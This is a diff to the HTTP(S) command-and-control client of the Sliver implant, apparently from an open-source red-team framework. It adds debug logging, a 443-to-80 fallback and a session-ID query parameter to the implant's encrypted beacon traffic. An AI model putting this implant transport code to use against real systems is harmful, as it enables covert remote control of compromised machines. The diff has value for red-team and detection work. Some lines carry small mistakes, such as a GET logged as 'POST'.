@@ -10,7 +10,12 @@ import (
 	"errors"
 	"fmt"
 	"io/ioutil"
+	"strings"
+
+	// {{if .Debug}}
 	"log"
+	// {{end}}
+
 	"net"
 	"net/http"
 	"net/url"
@@ -33,6 +38,10 @@ func HTTPStartSession(address string) (*SliverHTTPClient, error) {
 	client = httpsClient(address)
 	err := client.SessionInit()
 	if err != nil {
+		// If we're using default ports then switch to 80
+		if strings.HasSuffix(address, ":443") {
+			address = fmt.Sprintf("%s:80", address[:len(address)-4])
+		}
 		client = httpClient(address) // Fallback to insecure HTTP
 		err = client.SessionInit()
 		if err != nil {
@@ -81,7 +90,7 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	req, _ := http.NewRequest("GET", fmt.Sprintf("%s/rsakey", s.Origin), nil)
 	resp, err := s.Client.Do(req)
 	if err != nil || resp.StatusCode != 200 {
-		// {{if. Debug}}
+		// {{if .Debug}}
 		log.Printf("Failed to fetch server public key")
 		// {{end}}
 		return nil
@@ -94,12 +103,12 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 		// {{end}}
 		return nil
 	}
-	// {{if .Debug}}
-	log.Printf("RSA Fingerprint: %s", fingerprintSHA256(pubKeyBlock))
-	// {{end}}
 
 	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
 	if certErr == nil {
+		// {{if .Debug}}
+		log.Printf("[http] Go a valid public key")
+		// {{end}}
 		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
 		return cert.PublicKey.(*rsa.PublicKey)
 	}
@@ -114,7 +123,11 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 // session key yet.
 func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	reader := bytes.NewReader(sessionInit) // Already RSA encrypted
-	req, _ := http.NewRequest("POST", s.toURL("/start"), reader)
+	uri := s.toURL("/start")
+	req, _ := http.NewRequest("POST", uri, reader)
+	// {{if .Debug}}
+	log.Printf("[http] POST -> %s", uri)
+	// {{end}}
 	resp, err := s.Client.Do(req)
 	if err != nil {
 		return err
@@ -133,10 +146,14 @@ func (s *SliverHTTPClient) Get(urlPath string) ([]byte, error) {
 	if s.SessionID == "" || s.SessionKey == nil {
 		return nil, errors.New("no session")
 	}
-	req, _ := http.NewRequest("GET", s.toURL(urlPath), nil)
+	uri := s.toURL(urlPath)
+	req, _ := http.NewRequest("GET", uri, nil)
+	// {{if .Debug}}
+	log.Printf("[http] POST -> %s", uri)
+	// {{end}}
 	resp, err := s.Client.Do(req)
 	if err != nil {
-		// {{if. Debug}}
+		// {{if .Debug}}
 		log.Printf("[http] GET failed %v", err)
 		// {{end}}
 		return nil, err
@@ -155,10 +172,14 @@ func (s *SliverHTTPClient) Post(urlPath string, data []byte) ([]byte, error) {
 	}
 	reqData, err := GCMEncrypt(*s.SessionKey, data)
 	reader := bytes.NewReader(reqData)
-	req, _ := http.NewRequest("POST", s.toURL(urlPath), reader)
+	uri := s.toURL(urlPath)
+	// {{if .Debug}}
+	log.Printf("[http] POST -> %s", uri)
+	// {{end}}
+	req, _ := http.NewRequest("POST", uri, reader)
 	resp, err := s.Client.Do(req)
 	if err != nil {
-		// {{if. Debug}}
+		// {{if .Debug}}
 		log.Printf("[http] POST failed %v", err)
 		// {{end}}
 		return nil, err
@@ -171,9 +192,12 @@ func (s *SliverHTTPClient) Post(urlPath string, data []byte) ([]byte, error) {
 }
 
 func (s *SliverHTTPClient) toURL(urlPath string) string {
-	url, _ := url.Parse(s.Origin)
-	url.Path = path.Join(url.Path, urlPath)
-	return url.String()
+	curl, _ := url.Parse(s.Origin)
+	curl.Path = path.Join(curl.Path, urlPath)
+	q := curl.Query()
+	q.Set("sessionid", s.SessionID)
+	curl.RawQuery = q.Encode()
+	return curl.String()
 }
 
 // [ HTTP(S) Clients ] ------------------------------------------------------------
